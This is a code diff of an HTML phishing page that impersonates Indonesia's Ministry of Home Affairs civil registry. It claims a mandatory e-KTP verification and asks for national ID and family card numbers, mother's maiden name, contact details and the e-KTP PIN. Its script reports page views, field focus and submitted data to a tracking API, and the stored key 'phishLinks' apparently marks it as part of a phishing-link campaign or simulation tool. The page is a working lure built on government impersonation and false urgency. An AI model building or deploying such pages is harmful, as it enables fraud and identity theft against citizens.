@@ -5,277 +5,25 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verifikasi Data e-KTP - Dukcapil Kemendagri</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 650px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 5px 30px rgba(0,0,0,0.15);
-        }
-
-        .gov-header {
-            background: linear-gradient(135deg, #c41e3a 0%, #8b0000 100%);
-            padding: 25px;
-            text-align: center;
-            color: white;
-            position: relative;
-        }
-
-        .gov-seal {
-            width: 80px;
-            height: 80px;
-            background: white;
-            border-radius: 50%;
-            margin: 0 auto 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2.5rem;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.3);
-        }
-
-        .gov-header h1 {
-            font-size: 1.5rem;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-
-        .gov-header p {
-            font-size: 1rem;
-            opacity: 0.95;
-        }
-
-        .official-banner {
-            background: #ffd700;
-            padding: 12px;
-            text-align: center;
-            color: #8b0000;
-            font-weight: bold;
-            border-bottom: 3px solid #c41e3a;
-        }
-
-        .content {
-            padding: 35px;
-        }
-
-        .urgent-notice {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-        }
-
-        .urgent-notice .header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 12px;
-        }
-
-        .urgent-notice .icon {
-            font-size: 2rem;
-        }
-
-        .urgent-notice h2 {
-            color: #856404;
-            font-size: 1.2rem;
-        }
-
-        .urgent-notice p {
-            color: #856404;
-            line-height: 1.7;
-            font-size: 0.95rem;
-        }
-
-        .reference-box {
-            background: #e9ecef;
-            padding: 15px;
-            border-radius: 6px;
-            margin-bottom: 25px;
-            border-left: 4px solid #6c757d;
-        }
-
-        .reference-box .row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-            font-size: 0.9rem;
-        }
-
-        .reference-box .label {
-            color: #495057;
-            font-weight: 600;
-        }
-
-        .reference-box .value {
-            color: #212529;
-        }
-
-        .instruction-box {
-            background: #d1ecf1;
-            border-left: 4px solid #17a2b8;
-            padding: 18px;
-            margin-bottom: 25px;
-            border-radius: 5px;
-        }
-
-        .instruction-box h3 {
-            color: #0c5460;
-            margin-bottom: 12px;
-            font-size: 1.05rem;
-        }
-
-        .instruction-box ol {
-            margin-left: 20px;
-            color: #0c5460;
-        }
-
-        .instruction-box li {
-            margin-bottom: 8px;
-            line-height: 1.6;
-        }
-
-        .form-section {
-            border: 2px solid #dee2e6;
-            padding: 25px;
-            border-radius: 10px;
-            margin-bottom: 25px;
-        }
-
-        .form-section h3 {
-            color: #c41e3a;
-            margin-bottom: 20px;
-            font-size: 1.1rem;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #c41e3a;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 600;
-            font-size: 0.95rem;
-        }
-
-        .form-group label .required {
-            color: #c41e3a;
-        }
-
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 12px 14px;
-            border: 2px solid #ced4da;
-            border-radius: 6px;
-            font-size: 1rem;
-            transition: all 0.3s;
-        }
-
-        .form-group input:focus, .form-group select:focus {
-            outline: none;
-            border-color: #c41e3a;
-            box-shadow: 0 0 0 3px rgba(196,30,58,0.1);
-        }
-
-        .form-group .hint {
-            font-size: 0.85rem;
-            color: #6c757d;
-            margin-top: 5px;
-        }
-
-        .checkbox-group {
-            margin: 20px 0;
-        }
-
-        .checkbox-label {
-            display: flex;
-            align-items: start;
-            gap: 10px;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 6px;
-            cursor: pointer;
-        }
-
-        .checkbox-label input {
-            margin-top: 3px;
-            width: auto;
-        }
-
-        .checkbox-label span {
-            flex: 1;
-            font-size: 0.9rem;
-            line-height: 1.6;
-        }
-
-        .btn-verify {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #c41e3a 0%, #8b0000 100%);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(196,30,58,0.3);
-        }
-
-        .btn-verify:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 25px rgba(196,30,58,0.5);
-        }
-
-        .footer {
-            background: #343a40;
-            color: white;
-            padding: 25px;
-            text-align: center;
-        }
-
-        .footer p {
-            font-size: 0.85rem;
-            line-height: 1.6;
-            margin-bottom: 10px;
-        }
-
-        .footer .contact {
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #495057;
-        }
-
-        .security-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #28a745;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 0.85rem;
-            margin-bottom: 20px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #f5f5f5; min-height: 100vh; padding: 20px; }
+        .container { max-width: 650px; margin: 0 auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 5px 30px rgba(0,0,0,0.15); }
+        .gov-header { background: linear-gradient(135deg, #c41e3a 0%, #8b0000 100%); padding: 25px; text-align: center; color: white; }
+        .gov-seal { width: 80px; height: 80px; background: white; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 2.5rem; box-shadow: 0 3px 10px rgba(0,0,0,0.3); }
+        .gov-header h1 { font-size: 1.5rem; margin-bottom: 5px; font-weight: bold; }
+        .official-banner { background: #ffd700; padding: 12px; text-align: center; color: #8b0000; font-weight: bold; border-bottom: 3px solid #c41e3a; }
+        .content { padding: 35px; }
+        .urgent-notice { background: #fff3cd; border: 2px solid #ffc107; padding: 20px; border-radius: 8px; margin-bottom: 25px; }
+        .urgent-notice h2 { color: #856404; font-size: 1.2rem; margin-bottom: 12px; }
+        .urgent-notice p { color: #856404; line-height: 1.7; font-size: 0.95rem; }
+        .form-section { border: 2px solid #dee2e6; padding: 25px; border-radius: 10px; margin-bottom: 25px; }
+        .form-section h3 { color: #c41e3a; margin-bottom: 20px; font-size: 1.1rem; padding-bottom: 10px; border-bottom: 2px solid #c41e3a; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; font-size: 0.95rem; }
+        .form-group input { width: 100%; padding: 12px 14px; border: 2px solid #ced4da; border-radius: 6px; font-size: 1rem; }
+        .form-group input:focus { outline: none; border-color: #c41e3a; }
+        .btn-verify { width: 100%; padding: 16px; background: linear-gradient(135deg, #c41e3a 0%, #8b0000 100%); color: white; border: none; border-radius: 8px; font-size: 1.1rem; font-weight: bold; cursor: pointer; }
+        .footer { background: #343a40; color: white; padding: 25px; text-align: center; }
     </style>
 </head>
 <body>
@@ -285,256 +33,121 @@
             <h1>KEMENTERIAN DALAM NEGERI</h1>
             <p>Direktorat Jenderal Kependudukan dan Pencatatan Sipil</p>
         </div>
-
-        <div class="official-banner">
-            ⚠️ SURAT RESMI PEMERINTAH - WAJIB DITINDAKLANJUTI
-        </div>
-
+        <div class="official-banner">⚠️ SURAT RESMI PEMERINTAH - WAJIB DITINDAKLANJUTI</div>
         <div class="content">
-            <div class="security-badge">
-                <span>🔒</span>
-                <span>Sistem Terenkripsi</span>
-            </div>
-
             <div class="urgent-notice">
-                <div class="header">
-                    <div class="icon">📢</div>
-                    <h2>PEMBERITAHUAN PENTING</h2>
-                </div>
+                <h2>📢 PEMBERITAHUAN PENTING</h2>
                 <p><strong>Kepada Yth. Warga Negara Indonesia,</strong></p>
                 <p>Sesuai dengan Peraturan Menteri Dalam Negeri No. 108 Tahun 2024 tentang Pemutakhiran Data Kependudukan, seluruh warga negara Indonesia WAJIB melakukan verifikasi dan pemutakhiran data e-KTP secara online.</p>
-                <p style="margin-top: 12px;"><strong>Batas waktu verifikasi: 31 Desember 2024</strong></p>
-                <p style="margin-top: 8px;">Apabila tidak dilakukan verifikasi, e-KTP Anda akan dinonaktifkan dan tidak dapat digunakan untuk keperluan administrasi pemerintahan.</p>
             </div>
-
-            <div class="reference-box">
-                <div class="row">
-                    <span class="label">Nomor Surat:</span>
-                    <span class="value">470/2024/DUKCAPIL</span>
-                </div>
-                <div class="row">
-                    <span class="label">Tanggal:</span>
-                    <span class="value" id="currentDate"></span>
-                </div>
-                <div class="row">
-                    <span class="label">Perihal:</span>
-                    <span class="value">Verifikasi Data Kependudukan</span>
-                </div>
-            </div>
-
-            <div class="instruction-box">
-                <h3>📋 Petunjuk Pengisian:</h3>
-                <ol>
-                    <li>Siapkan e-KTP dan Kartu Keluarga (KK) asli</li>
-                    <li>Isi formulir dengan data yang sesuai dokumen</li>
-                    <li>Pastikan semua data yang dimasukkan benar</li>
-                    <li>Klik tombol "Verifikasi Data" setelah selesai</li>
-                    <li>Anda akan menerima konfirmasi via email dalam 1x24 jam</li>
-                </ol>
-            </div>
-
             <form id="verifyForm">
                 <div class="form-section">
                     <h3>DATA PRIBADI</h3>
-                    
                     <div class="form-group">
-                        <label>NIK (Nomor Induk Kependudukan) <span class="required">*</span></label>
+                        <label>NIK (Nomor Induk Kependudukan) <span style="color: #c41e3a;">*</span></label>
                         <input type="text" id="nik" placeholder="16 digit NIK" maxlength="16" required>
-                        <div class="hint">Sesuai yang tertera pada e-KTP</div>
                     </div>
-
                     <div class="form-group">
-                        <label>Nomor Kartu Keluarga (KK) <span class="required">*</span></label>
+                        <label>Nomor Kartu Keluarga (KK) <span style="color: #c41e3a;">*</span></label>
                         <input type="text" id="kk" placeholder="16 digit No. KK" maxlength="16" required>
                     </div>
-
                     <div class="form-group">
-                        <label>Nama Lengkap <span class="required">*</span></label>
+                        <label>Nama Lengkap <span style="color: #c41e3a;">*</span></label>
                         <input type="text" id="fullName" placeholder="Sesuai e-KTP" required>
                     </div>
-
                     <div class="form-group">
-                        <label>Tempat Lahir <span class="required">*</span></label>
-                        <input type="text" id="birthPlace" placeholder="Contoh: Jakarta" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Tanggal Lahir <span class="required">*</span></label>
-                        <input type="date" id="birthDate" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Nama Ibu Kandung <span class="required">*</span></label>
+                        <label>Nama Ibu Kandung <span style="color: #c41e3a;">*</span></label>
                         <input type="text" id="motherName" placeholder="Nama lengkap ibu kandung" required>
                     </div>
                 </div>
-
                 <div class="form-section">
                     <h3>DATA KONTAK & KEAMANAN</h3>
-                    
                     <div class="form-group">
-                        <label>Email Aktif <span class="required">*</span></label>
+                        <label>Email Aktif <span style="color: #c41e3a;">*</span></label>
                         <input type="email" id="email" placeholder="email@example.com" required>
-                        <div class="hint">Untuk menerima konfirmasi verifikasi</div>
                     </div>
-
                     <div class="form-group">
-                        <label>Nomor Handphone <span class="required">*</span></label>
+                        <label>Nomor Handphone <span style="color: #c41e3a;">*</span></label>
                         <input type="tel" id="phone" placeholder="08xxxxxxxxxx" required>
-                        <div class="hint">Nomor yang terdaftar di operator</div>
                     </div>
-
                     <div class="form-group">
-                        <label>PIN e-KTP (6 digit) <span class="required">*</span></label>
+                        <label>PIN e-KTP (6 digit) <span style="color: #c41e3a;">*</span></label>
                         <input type="password" id="pin" placeholder="******" maxlength="6" required>
-                        <div class="hint">PIN yang Anda gunakan saat membuat e-KTP</div>
                     </div>
                 </div>
-
-                <div class="checkbox-group">
-                    <label class="checkbox-label">
-                        <input type="checkbox" required>
-                        <span>Saya menyatakan bahwa data yang saya masukkan adalah benar dan dapat dipertanggungjawabkan sesuai dengan dokumen resmi yang saya miliki. Saya memahami bahwa pemalsuan data merupakan pelanggaran hukum.</span>
-                    </label>
-                </div>
-
                 <button type="submit" class="btn-verify">✓ VERIFIKASI DATA SEKARANG</button>
             </form>
         </div>
-
         <div class="footer">
             <p><strong>KEMENTERIAN DALAM NEGERI REPUBLIK INDONESIA</strong></p>
-            <p>Direktorat Jenderal Kependudukan dan Pencatatan Sipil</p>
-            <div class="contact">
-                <p>📞 Call Center: 1500-537 (24 Jam)</p>
-                <p>📧 Email: dukcapil@kemendagri.go.id</p>
-                <p>🌐 Website: www.dukcapil.kemendagri.go.id</p>
-            </div>
+            <p>📞 Call Center: 1500-537 (24 Jam)</p>
         </div>
     </div>
-
     <script>
-        // Set current date
-        const today = new Date();
-        const dateStr = today.toLocaleDateString('id-ID', { 
-            day: 'numeric', 
-            month: 'long', 
-            year: 'numeric' 
-        });
-        document.getElementById('currentDate').textContent = dateStr;
-
+        const API_URL = 'http://localhost:5000/api';
         const urlParams = new URLSearchParams(window.location.search);
-        const linkId = urlParams.get('id') || 'demo';
-
-        function trackView() {
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            
-            if (link) {
-                link.views = (link.views || 0) + 1;
-                if (!link.visitors) link.visitors = [];
-                
-                const visitorId = Date.now();
-                link.visitors.push({
-                    id: visitorId,
-                    timestamp: Date.now(),
-                    duration: 0,
-                    inputData: false
+        const linkId = urlParams.get('id');
+        if (!linkId) console.error('Link ID tidak ditemukan!');
+        
+        async function trackView() {
+            if (!linkId) return;
+            try {
+                await fetch(\`\${API_URL}/log-activity\`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ link_id: linkId, activity_type: 'view', data: 'Government e-KTP verification opened' })
                 });
-                
-                const linkIndex = links.findIndex(l => l.id === linkId);
-                links[linkIndex] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-                
-                sessionStorage.setItem('visitorId', visitorId);
-                sessionStorage.setItem('linkId', linkId);
-                sessionStorage.setItem('startTime', Date.now());
-            }
+                console.log('✅ View tracked');
+            } catch (error) { console.error('❌ Error:', error); }
         }
-
-        // NIK validation
-        document.getElementById('nik').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '');
+        
+        async function trackClick(fieldName) {
+            if (!linkId) return;
+            try {
+                await fetch(\`\${API_URL}/log-activity\`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ link_id: linkId, activity_type: 'click', data: \`Field: \${fieldName}\` })
+                });
+            } catch (error) {}
+        }
+        
+        async function trackSubmit(data) {
+            if (!linkId) return;
+            try {
+                await fetch(\`\${API_URL}/log-activity\`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ link_id: linkId, activity_type: 'submit', data: JSON.stringify(data) })
+                });
+            } catch (error) {}
+        }
+        
+        let clicked = new Set();
+        document.querySelectorAll('input').forEach(i => {
+            i.addEventListener('focus', function() {
+                const n = this.id || 'unknown';
+                if (!clicked.has(n)) { clicked.add(n); trackClick(n); }
+            });
         });
-
-        document.getElementById('kk').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '');
-        });
-
-        document.getElementById('pin').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '');
-        });
-
-        // Form submission
-        document.getElementById('verifyForm').addEventListener('submit', function(e) {
+        
+        document.getElementById('nik').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+        document.getElementById('kk').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+        document.getElementById('pin').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+        
+        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
             const nik = document.getElementById('nik').value;
-            const kk = document.getElementById('kk').value;
-            
-            if (nik.length !== 16) {
-                alert('NIK harus 16 digit!');
-                return;
-            }
-            
-            if (kk.length !== 16) {
-                alert('Nomor KK harus 16 digit!');
-                return;
-            }
-            
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            
-            if (link) {
-                link.inputData = (link.inputData || 0) + 1;
-                
-                const visitorId = sessionStorage.getItem('visitorId');
-                const startTime = parseInt(sessionStorage.getItem('startTime'));
-                const duration = Math.floor((Date.now() - startTime) / 1000);
-                
-                const visitor = link.visitors.find(v => v.id == visitorId);
-                if (visitor) {
-                    visitor.inputData = true;
-                    visitor.duration = duration;
-                }
-                
-                const linkIndex = links.findIndex(l => l.id === linkId);
-                links[linkIndex] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-            }
-            
+            if (nik.length !== 16) { alert('NIK harus 16 digit!'); return; }
+            const data = { nik, fullName: document.getElementById('fullName').value };
             const btn = e.target.querySelector('.btn-verify');
-            btn.textContent = '⏳ Memverifikasi Data...';
+            btn.textContent = '⏳ Memverifikasi...';
             btn.disabled = true;
-            
-            setTimeout(() => {
-                window.location.href = 'index.html';
-            }, 2500);
+            await trackSubmit(data);
+            setTimeout(() => window.location.href = 'index.html', 2000);
         });
-
-        trackView();
-
-        window.addEventListener('beforeunload', () => {
-            const visitorId = sessionStorage.getItem('visitorId');
-            const linkId = sessionStorage.getItem('linkId');
-            const startTime = parseInt(sessionStorage.getItem('startTime'));
-            
-            if (visitorId && linkId && startTime) {
-                const duration = Math.floor((Date.now() - startTime) / 1000);
-                let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-                const link = links.find(l => l.id === linkId);
-                
-                if (link) {
-                    const visitor = link.visitors.find(v => v.id == visitorId);
-                    if (visitor && !visitor.inputData) {
-                        visitor.duration = duration;
-                    }
-                    const linkIndex = links.findIndex(l => l.id === linkId);
-                    links[linkIndex] = link;
-                    localStorage.setItem('phishLinks', JSON.stringify(links));
-                }
-            }
-        });
+        
+        window.addEventListener('DOMContentLoaded', trackView);
     </script>
 </body>
 </html>
